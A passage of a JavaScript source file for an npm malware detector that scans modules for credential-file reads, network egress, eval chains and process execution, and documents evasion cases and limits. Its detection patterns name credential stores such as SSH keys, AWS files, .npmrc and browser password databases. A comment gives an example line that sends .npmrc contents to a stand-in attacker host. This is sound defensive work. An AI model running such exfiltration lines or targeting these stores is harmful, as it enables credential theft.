// packages/fw-agent/src/behavior-tracker.js
// Behavioral analyzer for sequence-based threat detection.
// Tracks dangerous action sequences within a single module.

const { AhoCorasick } = require('./aho-corasick');

// Signal detection patterns for each behavioral category
const SIGNAL_PATTERNS = {
  // Reads sensitive credential files (fs-based). process.env is tracked separately
  // via ENV_READ to avoid false-positive CREDENTIAL_EXFILTRATION on normal HTTP libraries.
  SENSITIVE_READ: [
    /fs\s*\.\s*readFile/,
    /fs\s*\.\s*readFileSync/,
    /fs\s*\.\s*open(?:Sync)?\s*\(/,
  ],
  // Bare environment variable access — common in normal apps; escalates to WARN only
  // unless a SENSITIVE_PATH is also present (genuine credential file access).
  ENV_READ: [
    /process\s*\.\s*env\b/,
  ],
  SENSITIVE_PATH: [
    // Match .env only as a file-path reference (preceded by quote, slash, or backtick),
    // not as a property access like `process.env.FOO` (F-16 false-positive fix).
    /['"\/`]\.env\b/i,
    /[\/\\][\w.\-]{0,40}credentials/i,
    /[\/\\]\.ssh\b/,
    /id_rsa/,
    /[\/\\]\.netrc/,
    /[\/\\]\.aws\b/,
    /[\/\\][\w.\-]{0,40}secret/i,
    /[\/\\][\w.\-]{0,40}passwd/i,
    /[\/\\][\w.\-]{0,40}shadow/i,
  ],
  // Infrastructure / browser credential stores (kubeconfig, docker registry auth, Chrome's
  // "Login Data" password DB). UNLIKE ~/.ssh or ~/.aws, these files ARE legitimately read by
  // real packages — @kubernetes/client-node reads ~/.kube/config, docker clients read
  // ~/.docker/config.json — and those libraries then make network calls to the cluster/registry.
  // So a bare "read + network egress" here is NOT proof of theft and must not hard-block, or we
  // false-positive on legit infra clients. They only become a CREDENTIAL_EXFILTRATION signal
  // when paired with a DELIBERATE exfil destination (a hardcoded non-registry host or an explicit
  // {host:...} override) — same WHERE-does-the-data-go discriminator used for .npmrc. Kept in a
  // separate list (not SENSITIVE_PATH) precisely so the stricter escalation rule applies. Closes
  // red-team exfil-docker-config / exfil-kube-config / exfil-browser-cookies without FP risk.
  SENSITIVE_CONFIG_PATH: [
    /[\/\\]\.kube[\/\\]config\b/i,
    /[\/\\]\.docker[\/\\]config\.json/i,
    /[\/\\]Login Data\b/,
  ],
  // .npmrc is its own (weaker) signal, not a SENSITIVE_PATH (F-30 redo): every npm client,
  // installer, and publish tool legitimately reads .npmrc to resolve the registry URL, so
  // bare "reads .npmrc + makes a network call" is not evidence of anything by itself. It only
  // becomes a credential-theft signal combined with an actual token-field reference, an
  // explicit host override, or a hardcoded exfil destination below -- see the escalation rule
  // in analyzeModule(). NOTE: the first cut of F-30 gated escalation solely on the literal
  // string `_authToken` appearing in the module, which missed the more common real attack --
  // reading the whole file and shipping it without ever naming the field
  // (`fetch('http://evil.example/c?d='+fs.readFileSync('.npmrc'))`). The discriminator that
  // actually holds is WHERE the data goes, not whether a field name is parsed out of it.
  NPMRC_READ: [
    /\.npmrc/i,
  ],
  // The npm auth token/password fields in a real .npmrc, e.g.
  // `//registry.npmjs.org/:_authToken=...` or `_auth=...` -- these are the actual secret,
  // as opposed to the plain `registry=` config line every package manager reads.
  NPMRC_TOKEN: [
    /_authToken/i,
    /_auth\b/i,
    /_password\b/i,
    /authToken/i,
  ],
  // Explicit destination override alongside a network call, e.g. https.request({host:
  // 'evil.example', ...}) -- a deliberate redirect, not the ambiguous case a bare hardcoded
  // URL literal can be (see HARDCODED_EGRESS_CALL).
  HOST_OPTION: [
    /host\s*:\s*['"`][^'"`]+/,
  ],
  // Makes outbound network connections
  NETWORK_EGRESS: [
    /http\s*\.\s*request\s*\(/,
    /https\s*\.\s*request\s*\(/,
    /http\s*\.\s*get\s*\(/,
    /https\s*\.\s*get\s*\(/,
    /\bfetch\s*\(/,
    /net\s*\.\s*connect\s*\(/,
    /net\s*\.\s*createConnection\s*\(/,
    /socket\s*\.\s*connect\s*\(/,
    /new\s+WebSocket\s*\(/,
    /XMLHttpRequest/,
    /tls\s*\.\s*connect\s*\(/,
    /dgram\s*\.\s*createSocket/,
    // Inline require("https").get/request — not caught by the patterns above
    /require\s*\(\s*['"]https?['"]\s*\)\s*\.\s*(?:get|request)\s*\(/,
    // Inline require("net"|"tls"|"dgram").<call> — the bound forms above match `net.connect(`
    // but not the one-liner `require("net").connect(` idiom used to dodge the egress signal
    // (red-team exfil-inline-require-net). Mirrors the http/https inline pattern.
    /require\s*\(\s*['"](?:net|tls|dgram)['"]\s*\)\s*\.\s*(?:connect|createConnection|createSocket|request|get)\s*\(/,
    // Non-HTTP egress channels used to smuggle data out: DNS-tunnel (dns.resolve/resolveTxt/…,
    // NOT dns.lookup which is ubiquitous and internal) and navigator.sendBeacon. These only
    // matter as egress when combined with a credential read (CREDENTIAL_EXFILTRATION) — bare use
    // is harmless. red-team exfil-dns-tunnel / exfil-env-sendbeacon.
    /dns\s*\.\s*resolve[A-Za-z0-9]*\s*\(/,
    /navigator\s*\.\s*sendBeacon\s*\(/,
  ],
  // Generates or evaluates code at runtime
  DYNAMIC_CODE: [
    /\beval\s*\(/,
    /new\s+Function\s*\(/,
    /\bFunction\s*\(\s*['"`]/,
    /vm\s*\.\s*runIn(?:This|New|)Context\s*\(/,
    /vm\s*\.\s*Script\s*\(/,
    /\bsetTimeout\s*\(\s*['"`]/,
    /\bsetInterval\s*\(\s*['"`]/,
    /Script\s*\.\s*runInNewContext/,
    // Inline require("vm").runInThisContext/Script — the bound `vm.runInThisContext(` form is
    // matched above, but the one-liner require("vm").runInThisContext( dodges it (red-team
    // dce-inline-require-vm). Mirrors the inline-require egress pattern in NETWORK_EGRESS.
    /require\s*\(\s*['"]vm['"]\s*\)\s*\.\s*(?:runIn(?:This|New|)Context|Script)\s*\(/,
    // Indirect eval — `(0, eval)(code)` runs the string in global scope without a literal
    // `eval(` call site (red-team sc-githubusercontent-eval). The `(0,eval)` construct is a
    // deliberate idiom that does not occur in ordinary code, so this is safe as a dynamic-code
    // signal (it still only blocks when chained with egress/process-exec, never alone).
    /\(\s*0\s*,\s*eval\s*\)/,
  ],
  // Decodes an encoded blob (base64/hex) back into a string. On its own this is benign
  // (every HTTP/crypto library does it); it only matters combined with DYNAMIC_CODE — the
  // classic "decode an opaque payload, then eval it" obfuscation. Kept narrow on purpose:
  // Buffer.from must name a 'base64'/'hex' encoding (bare Buffer.from(x) is a byte copy, not
  // a decode), and atob() is the browser/base64 decoder. F-31.
  CODE_DECODE: [
    /\batob\s*\(/,
    /Buffer\s*\.\s*from\s*\([^)]*['"`](?:base64|hex)['"`]\s*\)/i,
  ],
  // Executes external processes
  PROCESS_EXEC: [
    /child_process/,
    /\bexecSync\s*\(/,
    /\bspawnSync\s*\(/,
    /\bexecFile\s*\(/,
    /\bexecFileSync\s*\(/,
    /ShellString/,
    // process.binding("spawn_sync"|"process_wrap"|"pipe_wrap") is the low-level internal path to
    // launch a process, used to dodge the child_process signal (red-team dce-process-binding).
    // Anchored to the process-spawning bindings ONLY: bare process.binding( also names benign
    // internals — lodash/sequelize use process.binding('util') for type detection — so matching
    // any binding false-positived DYNAMIC_CODE_EXEC_CHAIN alongside their Function('return this').
    /process\s*\.\s*binding\s*\(\s*['"`](?:spawn_sync|process_wrap|pipe_wrap)/i,
  ],
  // Loads modules dynamically or via non-literal paths
  DYNAMIC_REQUIRE: [
    /require\s*\.\s*resolve\s*\(/,
    /module\s*\._load\s*\(/,
    /require\s*\(\s*(?!['"`])[^)]+\)/,  // require(variable)
  ],
};

function matchesAny(content, patterns) {
  return patterns.some(p => p.test(content));
}

// Length-preserving blank: replace every non-newline character with a space (newlines kept, so
// line structure and any line-anchored regex behaviour survive). Used to sanitize comments /
// module specifiers / URLs OUT of scanSrc while keeping scanSrc EXACTLY the same length as the
// raw content it was derived from. That length invariant is what makes F-73 sound: a match's
// character offset in the sanitized scanSrc is the identical offset in raw content, so proximity
// and structural correlation can measure distances across sanitized-derived signals (positions
// taken from scanSrc) and raw-derived signals (positions taken from content) in ONE coherent
// coordinate space. The previous scanSrc collapsed those spans to shorter strings, which shifted
// every subsequent offset and is why positions had to be recomputed against raw content — the
// exact source/position mismatch F-73 describes.
function blankKeep(s) {
  return s.replace(/[^\n]/g, ' ');
}

// ── F-43/F-68 + F-69: structural, padding-resistant multi-signal correlation ─────────────────
// A multi-signal rule (e.g. "reads a credential path AND makes a network call") must not fire on
// whole-file boolean co-occurrence alone. That is correct for a small hand-written malicious
// module (everything is naturally adjacent) but false-positives hard on large bundled/minified
// files: a single rollup/webpack/vite chunk routinely contains a credential-path-shaped literal,
// a network call, an eval(), a base64 decode, and a child_process reference SOMEWHERE in tens or
// hundreds of KB of unrelated legitimate code. Confirmed on the real vite dist/node chunk
// (1.35MB): a `.npmrc` reference and an unrelated `host:` object key are a coincidental ~312
// characters apart while the actual network call is 68,519 characters from either. So the rules
// require the SPECIFIC signals a rule combines to be genuinely CORRELATED, not merely co-present.
//
// F-69: correlation was originally a fixed CHARACTER window (200). That is padding-defeatable BY
// CONSTRUCTION -- an attacker inserts ~100-150 characters of comment/whitespace between the two
// halves of a payload and the signals fall outside the window, flipping a real credential-exfil /
// fetch-and-exec from a CRITICAL block to a WARN that loads (confirmed: the pre-fix engine misses
// every contextual detector at >=200 chars of comment padding). Widening the window is explicitly
// rejected -- any fixed character distance is defeatable by adding that many characters.
//
// The primitive is therefore SEPARATOR distance, measured on the sanitized length-preserving
// scanSrc (comments already blanked to spaces, so their braces/semicolons do not count): the
// number of statement/block separators ( ; { } ) between two signal offsets. Comment and
// whitespace padding contain NO separators, so they add ZERO separator distance to the SEPARATOR
// cap below -- real intervening CODE is what adds separators (further hardened by F-81, see
// buildSeparatorPrefix, to also count Automatic-Semicolon-Insertion statement boundaries that
// carry no literal ';{}' at all), so an attacker can only exhaust the separator budget by
// inserting real statements between the two signals (the honest, documented evasion limit for
// that cap specifically), and the coincidental pairings in minified megabundles -- thousands of
// statements apart -- stay uncorrelated exactly as before.
//
// CORRECTED CLAIM (PENTEST-003 finding): separator-count is unconditionally immune to
// comment/whitespace padding, at ANY size -- but withinContext() ANDs that cap with a second,
// independent CHARACTER cap (below), and either cap alone excludes a window. So the overall
// correlation is NOT literally "invariant to arbitrarily large" padding of any kind, as an
// earlier version of this comment claimed -- it is bounded by CORRELATION_MAX_CHARS regardless of
// padding composition, comment/whitespace included. In practice this ceiling is rarely the
// binding constraint: real intervening CODE (the only thing that can defeat the separator cap)
// exhausts the SEPARATOR budget at ~5 real statements, which is virtually always far fewer than
// 8000 characters, so the separator cap is what actually stops a realistic attack. The character
// cap only becomes the sole constraint for padding that is deliberately shaped to add zero
// separators regardless of size -- comments, whitespace, or (see F-81's residual-limit note on
// buildSeparatorPrefix) a single very long statement -- where it is a hard, disclosed ceiling at
// CORRELATION_MAX_CHARS, not a "generous, never-the-limiting-factor" backstop as originally
// described. See the padding-adversary tests in behavior-tracker-unit-test.js, which now assert
// the honest boundary (immune well past 1000 chars, falls off at the 8000-char cap) instead of
// only testing sizes safely below it.
//
// CORRELATION_MAX_SEPARATORS swept empirically (same method that chose the old 200 window),
// holding the char backstop at 8000, against the red-team suite (125 malicious + 27 benign), the
// fw-control adversarial suite (53 cases), and a real false-positive corpus of 4,532 .js/.mjs/.cjs
// files from vite/astro/babel-core/@babel/webpack/rollup/esbuild/typescript/eslint/knex/sequelize/
// mongodb/express/got/undici/axios/ws/execa/tar/... (incl. transitive deps):
//
//   maxSep  red-team(regr,fp)  adversarial  real-corpus FP files
//   2       1 regression        FAIL         0     (a genuine 2-statement-apart TP stops being caught)
//   3       0, 0                PASS         0
//   4       0, 0                PASS         0
//   5       0, 0                PASS         0   <- selected (midpoint of the safe window)
//   6       0, 0                PASS         0
//   7       0, 0                PASS         0
//   8       0, 0                PASS         1   (babel-core lib/api/browser.js: a genuine XHR-fetch +
//                                                 `new Function`, 337 chars / 8 separators apart --
//                                                 the SAME file the old char sweep FP'd at window>=400)
//
// The safe window is [3,7]; 5 is its midpoint, catching every true positive with two separators of
// margin above the TP floor and three below the babel-core false-positive ceiling. Padding-adversary
// coverage: with maxSep=5, every contextual detector stays caught through 1000+ chars of comment AND
// whitespace padding (behavior-tracker-unit-test.js), and detection falls off only once >=5 real
// intervening statements are added -- the documented structural evasion limit.
const CORRELATION_MAX_SEPARATORS = 5;
const CORRELATION_MAX_CHARS = 8000;

// ── F-81 (PENTEST-003 finding, F-69 follow-on) ────────────────────────────────────────────────
// Counting only literal ';' '{' '}' characters misses a real-code shape that contains genuine
// statement structure but zero literal separator characters: MANY statements relying on
// Automatic Semicolon Insertion (no ';') and no blocks/object literals (no '{'/'}') -- e.g. a
// sequence of `const x1 = 1` / `const x2 = 1` / ... each on its own line. Arbitrarily many such
// statements between two signals previously counted as ZERO separators, so the "falls off at
// >=5 real intervening statements" invariant this file documents did not actually hold for
// semicolon-free code -- it held for NO count of ASI-style statements at all.
//
// Fixed here, in the same single forward pass that already counts ';{}', without weakening
// padding immunity for comment/whitespace filler (verified: the padding-adversary test matrix is
// unchanged in outcome, including at sizes far larger than previously tested): a newline is ALSO
// counted as a separator if the line it terminates contains real (non-whitespace) content AND
// that content did not already end in ';'/'{'/'}' (avoiding double-counting an ordinary
// `stmt;\n` line, which already credited the ';'). A blanked comment/whitespace-padding line has
// no real content (blankKeep() reduces it to spaces -- see F-73), so it is correctly never
// credited, however many such lines a padding block spans: arbitrarily many blank/comment-only
// lines still contribute zero, at any size.
//
// ── Known, disclosed residual limit: a SINGLE arbitrarily long statement ───────────────────────
// This fix does NOT close, and CANNOT close, the narrower case PENTEST-003 actually demonstrated
// live: a single real statement (e.g. one huge string-literal assignment, no internal newline, no
// ';{}' anywhere) between two signals. That is genuinely one statement, zero real intervening
// separators, no matter how many characters it spans -- padding-statement COUNT is not the
// vulnerable dimension there, raw CHARACTER LENGTH of that one statement is. A first attempt at
// closing it here (crediting an extra separator every N characters of unbroken non-whitespace
// content, regardless of statement count) was tried and is NOT included: it cannot work, by
// construction of withinContext() below. Both of withinContext's caps (separator span, character
// span) point the SAME direction -- a window only counts as correlated (fires the rule) when it
// is SMALL in both -- so adding synthetic separators to a long single statement only ever makes
// two signals look FURTHER apart, never closer; it cannot flip a window from invalid to valid.
// And for this exact case, CORRELATION_MAX_CHARS already independently excludes the window before
// separator-count is even relevant (a 9000-char single statement already exceeds the 8000-char
// backstop on its own). Raising CORRELATION_MAX_CHARS does not help either: it is the SAME "any
// fixed character distance is defeatable by adding that many characters" argument this file's own
// F-69 design comment already makes about the outer (200-char) mechanism, recursed one level down
// onto the backstop -- an attacker can always construct a statement one character longer than
// whatever threshold is chosen. This is a mathematically inherent limit of a zero-AST,
// character/separator-distance correlation primitive, not an oversight: distinguishing "one very
// long but semantically ordinary statement" (a big embedded JSON/base64 blob, a large lookup
// table -- real code this engine must not false-positive on) from "one very long but ENTIRELY
// INERT padding statement constructed purely to evade detection" requires understanding what the
// statement actually DOES, which is out of reach for text-scanning alone. Disclosed, not silently
// missed -- see the dedicated evasion-limit test in behavior-tracker-unit-test.js and SECURITY.md.
function buildSeparatorPrefix(scanSrc) {
  const n = scanSrc.length;
  const sep = new Int32Array(n + 1);
  let count = 0;
  let lineHasContent = false;     // real (non-whitespace) content seen since the last line start
  let lastWasBoundary = false;    // the last real character seen was ';', '{', or '}'
  for (let i = 0; i < n; i++) {
    const c = scanSrc.charCodeAt(i);
    if (c === 59 /* ; */ || c === 123 /* { */ || c === 125 /* } */) {
      count++;
      lineHasContent = true;
      lastWasBoundary = true;
    } else if (c === 10 /* \n */) {
      // F-81: an ASI-plausible statement boundary -- this line had real content and did not
      // already end in a literal separator (which would have credited it above already).
      if (lineHasContent && !lastWasBoundary) {
        count++;
        lastWasBoundary = true;
      }
      lineHasContent = false;
    } else if (c !== 32 /* space */ && c !== 9 /* tab */ && c !== 13 /* \r */) {
      // A real, non-whitespace character (blanked comment/URL/specifier content is all spaces,
      // by construction of blankKeep() -- see F-73 -- so it never reaches this branch).
      lineHasContent = true;
      lastWasBoundary = false;
    }
    // Whitespace (space/tab/CR) neither breaks nor extends line-content tracking -- it is
    // invisible to both signals, matching ordinary intra-statement spacing.
    sep[i + 1] = count;
  }
  return sep;
}

// Collect every match START INDEX (character offset into `content`) for every pattern in
// `patterns`, regardless of whether each pattern already carries a global flag.
function matchAllPositions(content, patterns) {
  const positions = [];
  for (const p of patterns) {
    const flags = p.flags.includes('g') ? p.flags : p.flags + 'g';
    const re = new RegExp(p.source, flags);
    let m;
    while ((m = re.exec(content)) !== null) {
      positions.push(m.index);
      if (re.lastIndex === m.index) re.lastIndex++; // guard against zero-length matches
    }
  }
  return positions;
}

// F-69 structural correlation: does there exist a window (one position from EVERY group) whose
// extent satisfies BOTH the separator cap AND the character cap simultaneously? A smallest-window
// two-pointer sweep whose shrink condition is "either cap exceeded". Both
// the separator span (sepPrefix[hi] - sepPrefix[lo], padding-immune) and the character span
// (hi - lo, the weak backstop) are monotonic in window width, so advancing `left` until both hold
// is a valid sliding window. `positions` are offsets in the shared length-preserving coordinate
// (scanSrc for sanitized-derived signals, content for raw-derived signals -- they share offsets).
function withinContext(positionGroups, sepPrefix, maxSeparators, maxChars) {
  if (positionGroups.some(g => g.length === 0)) return false;
  const points = [];
  positionGroups.forEach((positions, groupIndex) => {
    for (const pos of positions) points.push([pos, groupIndex]);
  });
  if (points.length === 0) return false;
  points.sort((a, b) => a[0] - b[0]);

  const counts = new Array(positionGroups.length).fill(0);
  let filled = 0;
  let left = 0;
  for (let right = 0; right < points.length; right++) {
    const rightGroup = points[right][1];
    if (counts[rightGroup]++ === 0) filled++;
    while (
      (points[right][0] - points[left][0]) > maxChars ||
      (sepPrefix[points[right][0]] - sepPrefix[points[left][0]]) > maxSeparators
    ) {
      const leftGroup = points[left][1];
      if (--counts[leftGroup] === 0) filled--;
      left++;
    }
    if (filled === positionGroups.length) return true;
  }
  return false;
}

// Literal substrings that are a superset of all SIGNAL_PATTERN regexes.
// Used as a fast pre-screener: if none appear in content, all signal checks are
// guaranteed false and the expensive scanSrc normalization + regex loop can be
// skipped. A false positive (keyword present but regex doesn't match) is safe;
// a false negative would miss a detection and is prevented by the superset property.
const BEHAVIOR_PRESCREENER_KEYWORDS = [
  // SENSITIVE_READ
  'readfile', 'fs.open',
  // ENV_READ
  'process.env',
  // SENSITIVE_PATH
  '.env', 'credentials', '.ssh', 'id_rsa', '.netrc', '.aws', 'secret', 'passwd', 'shadow',
  // SENSITIVE_CONFIG_PATH
  '.kube', '.docker', 'login data',
  // NPMRC_READ / NPMRC_TOKEN
  '.npmrc', '_authtoken', '_auth', '_password', 'authtoken',
  // HOST_OPTION
  'host:',
  // NETWORK_EGRESS
  'http.request', 'https.request', 'http.get', 'https.get',
  'fetch(', 'net.connect', 'net.createconnection', 'socket.connect',
  'websocket', 'xmlhttprequest', 'tls.connect', 'dgram.createsocket',
  'dns.resolve', 'sendbeacon',
  // inline require("http"|"https"|"net"|"tls"|"dgram").method() forms
  'require("http', "require('http", 'require("https', "require('https",
  'require("net', "require('net", 'require("tls', "require('tls",
  'require("dgram', "require('dgram", 'require("vm', "require('vm",
  // DYNAMIC_CODE
  'eval(', 'new function', 'function(', 'vm.runincontext', 'vm.runinnewcontext',
  'vm.runinthiscontext', 'runinnewcontext', 'vm.script(', 'settimeout(', 'setinterval(', '(0,eval)',
  // CODE_DECODE
  'atob(', 'buffer.from',
  // PROCESS_EXEC
  'child_process', 'execsync(', 'spawnsync(', 'execfile(', 'execfilesync(', 'shellstring',
  'process.binding(',
  // DYNAMIC_REQUIRE (unambiguous forms; bare require(var) is checked separately)
  'require.resolve(', 'module._load',
];

const BEHAVIOR_PRESCREENER_KEYWORDS_NO_WS = BEHAVIOR_PRESCREENER_KEYWORDS.map(kw => kw.replace(/\s+/g, ''));

// A quoted absolute URL passed directly as the argument of an actual network-call site --
// distinguishes theft (hardcodes the destination) from legit npm tooling (builds the URL
// from config, e.g. `fetch(`${registry}/${name}`)`). Anchored to the call site itself (not
// "any quoted URL anywhere in the file") so a legit fallback-default constant sitting next to
// a config-driven fetch -- e.g.
// `const registry = cfg.match(...) ? m[1] : 'https://registry.npmjs.org'` -- does not
// false-positive just because that literal exists somewhere in the module. Matched against
// raw `content`, not `scanSrc`: scanSrc already strips all https?:// literals wholesale (see
// the URL-stripping replace() in analyzeModule()) so a content-based check here would never
// match if run against scanSrc. Kept outside SIGNAL_PATTERNS (and not a matchesAny() boolean
// check) because it needs its capture group -- callers that iterate SIGNAL_PATTERNS expecting
// arrays of boolean-test regexes (e.g. the registry's watch-changes.js evidence reconstruction)
// would break on a single global regex with a capture group.
const HARDCODED_EGRESS_CALL = /(?:https?\s*\.\s*(?:get|request)|fetch|net\s*\.\s*(?:connect|createConnection)|socket\s*\.\s*connect|new\s+WebSocket|tls\s*\.\s*connect|require\s*\(\s*['"]https?['"]\s*\)\s*\.\s*(?:get|request))\s*\(\s*['"`](https?:\/\/[^'"`$\s]+)/g;

class BehaviorTracker {
  constructor() {
    // Per-module signal cache (filename -> signals). Shape is unchanged from the intra-file
    // era so analyzePackage() / callers that iterate it keep working.
    this.moduleSignals = new Map();
    // filename -> packageKey, used to SCOPE cross-file correlation to a single npm package.
    // The runtime firewall resets per dependency-tree root, so without scoping analyzePackage()
    // would pair signals across the whole app (a config-reading module + any http module) and
    // false-positive. The registry batch scanner resets per package and passes no key, so its
    // whole-map behavior is preserved.
    this.filePackage = new Map();
    // Accumulated violations for telemetry
    this.violations = [];
    // Fast-path pre-screener: single Aho-Corasick over all signal literal substrings.
    this._prescreener = new AhoCorasick(BEHAVIOR_PRESCREENER_KEYWORDS);
    // Whitespace-normalized pre-screener catches spaced variants like `fetch (...)`.
    this._prescreenerNoWs = new AhoCorasick(BEHAVIOR_PRESCREENER_KEYWORDS_NO_WS);
  }

  /**
   * Analyze a module and return any behavioral violations found.
   * Checks intra-module signal sequences. `packageKey` (optional) tags this file's signals so a
   * later analyzePackage(packageKey) can correlate only within the same package.
   *
   * `astSignals` (optional) — additional signal POSITIONS the Phase 3 AST pass (src/ast-scan.js)
   * resolved structurally (e.g. an obfuscated `String.fromCharCode(...)` decode primitive, or a
   * `require()` call whose specifier only resolves to a sensitive module name after folding an
   * array-join). This module owns zero new correlation logic for them: they are simply OR'd into
   * the existing boolean signal flags and concatenated into the existing position arrays below, so
   * every existing rule (DYNAMIC_CODE_EXEC_CHAIN, OBFUSCATED_CODE_EXECUTION, ...) and their
   * existing proximity/severity thresholds apply completely unchanged, regardless of whether a
   * given position came from a raw-text regex match or an AST resolution. Shape:
   * { dynamicCode: number[], processExec: number[], codeDecode: number[], sensitivePath: number[] }.
   */
  analyzeModule(filename, content, packageKey, astSignals) {
    if (!content) return [];
    astSignals = astSignals || {};
    const astDynamicCode = astSignals.dynamicCode || [];
    const astProcessExec = astSignals.processExec || [];
    const astCodeDecode = astSignals.codeDecode || [];
    const astSensitivePath = astSignals.sensitivePath || [];
    const astHasAnySignal = astDynamicCode.length > 0 || astProcessExec.length > 0 ||
      astCodeDecode.length > 0 || astSensitivePath.length > 0;

    const contentNoWs = content.replace(/\s+/g, '');

    // Fast-path: if no signal keyword is present in either the raw content or a
    // whitespace-collapsed variant, AND the AST pass found nothing either, all regex-based signal
    // checks are guaranteed to be false (the pre-screener is a superset of all SIGNAL_PATTERN
    // regexes). Skip the expensive scanSrc normalization chain and 60+ regex tests. The
    // astHasAnySignal guard is essential, not an optimization: a module whose ONLY signal is an
    // AST-resolved one (e.g. bracket-eval with no other recognizable keyword anywhere in the
    // file) would otherwise take this early return and the AST signal would simply be dropped on
    // the floor. DYNAMIC_REQUIRE is the one signal without an unambiguous literal keyword
    // (require(var) vs require('literal')), so it is checked separately.
    if (!astHasAnySignal && !this._prescreener.searchInsensitive(content) &&
        !this._prescreenerNoWs.searchInsensitive(contentNoWs)) {
      const dynamicRequire = matchesAny(content, SIGNAL_PATTERNS.DYNAMIC_REQUIRE);
      const signals = {
        sensitiveRead: false, sensitivePath: false, sensitiveConfigPath: false,
        npmrcRead: false, npmrcToken: false, hostOption: false,
        hardcodedEgress: false, hardcodedEgressNonRegistry: false,
        envRead: false, networkEgress: false, dynamicCode: false,
        codeDecode: false, processExec: false, dynamicRequire,
      };
      this.moduleSignals.set(filename, signals);
      if (packageKey !== undefined && packageKey !== null) this.filePackage.set(filename, packageKey);
      if (!dynamicRequire) return [];
      const found = [{
        rule: 'DYNAMIC_MODULE_LOAD',
        severity: 'MEDIUM',
        description: 'Module uses dynamic require() or module._load with a non-literal path',
      }];
      this.violations.push({ filename, violations: found, timestamp: Date.now() });
      return found;
    }

    // SENSITIVE_PATH / SENSITIVE_READ must only fire on genuine filesystem access, not on
    // import/require module specifiers (e.g. "@memberjunction/credentials") or URL paths
    // (e.g. "https://api.example.com/totpSecret"). Blank just the specifier STRING in place
    // (never drop the whole line/statement) so chained calls on the same line survive --
    // e.g. `const s = require('fs').readFileSync('.env')` must keep the '.env' argument
    // visible to SENSITIVE_PATH after the 'fs' specifier is blanked (F-27b regression: the
    // prior line-drop approach deleted this one-line idiom entirely, producing a false
    // negative on the most common credential-theft pattern).
    //
    // Comments come first in the chain (F-28): a path-shaped string mentioned only in
    // prose (e.g. `// src/auth/credentials.ts`) previously survived into scanSrc and, next
    // to any real networkEgress call elsewhere in the module, false-positived
    // CREDENTIAL_EXFILTRATION. Block comments are blanked to a space (preserves token
    // boundaries so adjoining code doesn't fuse); line comments are dropped up to the
    // newline, guarded by a negative lookbehind on ':' so the "//" in "https://" is never
    // mistaken for a comment start and real code following a same-line URL survives.
    // Every replacement below is LENGTH-PRESERVING (blanks to equal-length spaces, or blanks only
    // the specifier span between the kept quotes) so scanSrc.length === content.length and offsets
    // stay aligned to raw content -- see blankKeep() and F-73. Semantically identical to the prior
    // collapse-to-shorter version for the boolean signal checks (none of the SIGNAL_PATTERNS match
    // whitespace), but now positions taken from scanSrc share content's coordinate space.
    const scanSrc = content
      .replace(/\/\*[\s\S]*?\*\//g, blankKeep)       // block comments
      .replace(/(?<!:)\/\/[^\n]*/g, blankKeep)       // line comments
      .replace(/(\brequire\s*\(\s*)(['"`])((?:\\.|(?!\2)[^\\])*)\2(\s*\))/g,
               (m, pre, q, spec, tail) => pre + q + blankKeep(spec) + q + tail)  // require('spec')
      .replace(/(\bfrom\s+)(['"`])((?:\\.|(?!\2)[^\\])*)\2/g,
               (m, pre, q, spec) => pre + q + blankKeep(spec) + q)               // import ... from 'spec'
      .replace(/(\bimport\s*\(\s*)(['"`])((?:\\.|(?!\2)[^\\])*)\2(\s*\))/g,
               (m, pre, q, spec, tail) => pre + q + blankKeep(spec) + q + tail)  // import('spec')
      .replace(/https?:\/\/[^\s'"`]+/g, blankKeep)   // URLs
      .replace(/`[^`]*\$\{[^`]*`/g, blankKeep);      // template-literal URL builders

    // F-69: separator prefix-sum over the sanitized scanSrc, used by withinContext() below to
    // measure padding-immune structural distance between correlated signals.
    const sepPrefix = buildSeparatorPrefix(scanSrc);

    // Hardcoded-URL call sites, e.g. fetch('http://evil.example/...'). Extracted (not just
    // matched) so the escalation rule below can tell a hardcoded exfil host apart from a
    // hardcoded reference to the real npm registry (see hardcodedEgressNonRegistry). Position
    // captured alongside the URL so proximity checks below can use it too.
    const hardcodedEgressUrls = [];
    const hardcodedEgressCallSites = [];
    for (const m of content.matchAll(HARDCODED_EGRESS_CALL)) {
      hardcodedEgressUrls.push(m[1]);
      hardcodedEgressCallSites.push({ url: m[1], pos: m.index });
    }

    const signals = {
      sensitiveRead: matchesAny(scanSrc, SIGNAL_PATTERNS.SENSITIVE_READ),
      // AST-resolved sensitivePath (e.g. a path assembled from '/etc/' + 'sha' + 'dow') OR'd in
      // alongside the raw-text match — see the astSignals doc comment above analyzeModule().
      sensitivePath: matchesAny(scanSrc, SIGNAL_PATTERNS.SENSITIVE_PATH) || astSensitivePath.length > 0,
      sensitiveConfigPath: matchesAny(scanSrc, SIGNAL_PATTERNS.SENSITIVE_CONFIG_PATH),
      npmrcRead: matchesAny(scanSrc, SIGNAL_PATTERNS.NPMRC_READ),
      npmrcToken: matchesAny(scanSrc, SIGNAL_PATTERNS.NPMRC_TOKEN),
      hostOption: matchesAny(content, SIGNAL_PATTERNS.HOST_OPTION),
      hardcodedEgress: hardcodedEgressUrls.length > 0,
      hardcodedEgressNonRegistry: hardcodedEgressUrls.some(u => !/^https?:\/\/registry\.npmjs\.org\b/i.test(u)),
      envRead: matchesAny(content, SIGNAL_PATTERNS.ENV_READ),
      networkEgress: matchesAny(content, SIGNAL_PATTERNS.NETWORK_EGRESS),
      dynamicCode: matchesAny(content, SIGNAL_PATTERNS.DYNAMIC_CODE) || astDynamicCode.length > 0,
      // Matched against scanSrc (comments/URLs/specifiers stripped) so a decode call named
      // only in a comment cannot manufacture the OBFUSCATED_CODE_EXECUTION signal. F-31.
      codeDecode: matchesAny(scanSrc, SIGNAL_PATTERNS.CODE_DECODE) || astCodeDecode.length > 0,
      processExec: matchesAny(content, SIGNAL_PATTERNS.PROCESS_EXEC) || astProcessExec.length > 0,
      dynamicRequire: matchesAny(content, SIGNAL_PATTERNS.DYNAMIC_REQUIRE),
    };

    this.moduleSignals.set(filename, signals);
    if (packageKey !== undefined && packageKey !== null) this.filePackage.set(filename, packageKey);

    const found = [];

    // F-43/F-68 + F-69: every whole-file multi-signal correlation below additionally requires the
    // combined signals to be STRUCTURALLY correlated (withinContext: within
    // CORRELATION_MAX_SEPARATORS statement/block separators AND CORRELATION_MAX_CHARS characters of
    // each other) -- not just "each signal appears SOMEWHERE in this file".
    //
    // F-73 position-source rule (INVARIANT): each signal's positions are taken from the SAME
    // string its boolean flag was derived from -- scanSrc for the sanitized-derived signals
